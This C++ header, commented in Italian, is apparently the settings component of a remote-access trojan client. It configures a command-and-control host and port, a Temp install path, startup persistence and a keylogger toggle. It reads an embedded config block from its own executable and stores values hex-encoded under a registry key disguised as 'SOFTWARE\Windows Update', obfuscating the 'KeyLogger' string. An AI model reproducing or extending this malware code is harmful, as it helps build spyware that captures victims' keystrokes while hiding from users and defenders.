#pragma once

// Classe per la gestione dei settaggi
class Settaggi
{
private:
	DirUtils du;
	SettingsFile sf;
	RegUtils ru;
	Encode en;

public:
	string Host = "127.0.0.1";
	int Porta = 5555;
	string InstallPath = "C:\\Users\\<User>\\AppData\\Local\\Temp";
	string ExeName = "Client.exe";
	bool RegStartup = true;
	bool KeyLogger = true;
	string InstallDate = "";

	// Costruttore
	Settaggi()
	{
		sf.BufferOnly = true;
	}

	// Popola i settaggi ottenendoli dal relativo file
	bool GetSettingsFromExe()
	{
		string BinaryFileContent = du.GetBinaryFileContent(du.GetFullModuleFilePath());
		sf.Buff = en.HexToAscii(StringUtils::SimpleFind(BinaryFileContent, en.AsciiToHex("{START}"), en.AsciiToHex("{END}")));

		if (sf.Buff.empty()) return false;

		Host = sf.GetSetting("Host");
		Porta = stoi(sf.GetSetting("Port"));
		InstallPath = sf.GetSetting("InstallPath");
		ExeName = sf.GetSetting("ExeName");
		RegStartup = (sf.GetSetting("RegStartup") == "true");
		KeyLogger = (sf.GetSetting((string)AY_OBFUSCATE("KeyLogger")) == "true");

		return true;
	}

	// Popola i settaggi ottenendoli dal registro
	void GetSettingsFromReg()
	{
		string buffer;

		ru.ReadStringValue(ru.CurrentUser, "SOFTWARE\\Windows Update", en.AsciiToHex("Host"), buffer);
		Host = en.HexToAscii(buffer);

		ru.ReadStringValue(ru.CurrentUser, "SOFTWARE\\Windows Update", en.AsciiToHex("Port"), buffer);
		Porta = stoi(en.HexToAscii(buffer));

		ru.ReadStringValue(ru.CurrentUser, "SOFTWARE\\Windows Update", en.AsciiToHex("ExeName"), buffer);
		ExeName = en.HexToAscii(buffer);

		ru.ReadStringValue(ru.CurrentUser, "SOFTWARE\\Windows Update", en.AsciiToHex("RegStartup"), buffer);
		RegStartup = (en.HexToAscii(buffer) == "true");

		ru.ReadStringValue(ru.CurrentUser, "SOFTWARE\\Windows Update", en.AsciiToHex((string)AY_OBFUSCATE("KeyLogger")), buffer);
		KeyLogger = (en.HexToAscii(buffer) == "true");

		ru.ReadStringValue(ru.CurrentUser, "SOFTWARE\\Windows Update", en.AsciiToHex("InstallDate"), buffer);
		InstallDate = en.HexToAscii(buffer);
	}

	// Scrive i settaggi su registro
	bool InstallSettings()
	{
		if (!GetSettingsFromExe()) return false;

		if (!ru.CreateKey(ru.CurrentUser, "SOFTWARE\\Windows Update")) return false;

		if (!ru.WriteStringValue(ru.CurrentUser, "SOFTWARE\\Windows Update", en.AsciiToHex("Host"), en.AsciiToHex(Host))) return false;
		if (!ru.WriteStringValue(ru.CurrentUser, "SOFTWARE\\Windows Update", en.AsciiToHex("Port"), en.AsciiToHex(to_string(Porta)))) return false;
		if (!ru.WriteStringValue(ru.CurrentUser, "SOFTWARE\\Windows Update", en.AsciiToHex("ExeName"), en.AsciiToHex(ExeName))) return false;
		if (!ru.WriteStringValue(ru.CurrentUser, "SOFTWARE\\Windows Update", en.AsciiToHex("RegStartup"), en.AsciiToHex((RegStartup) ? "true" : "false"))) return false;
		if (!ru.WriteStringValue(ru.CurrentUser, "SOFTWARE\\Windows Update", en.AsciiToHex((string)AY_OBFUSCATE("KeyLogger")), en.AsciiToHex((KeyLogger) ? "true" : "false"))) return false;
		if (!ru.WriteStringValue(ru.CurrentUser, "SOFTWARE\\Windows Update", en.AsciiToHex("InstallDate"), en.AsciiToHex(DateTime::GetDateTime()))) return false;

		return true;
	}
};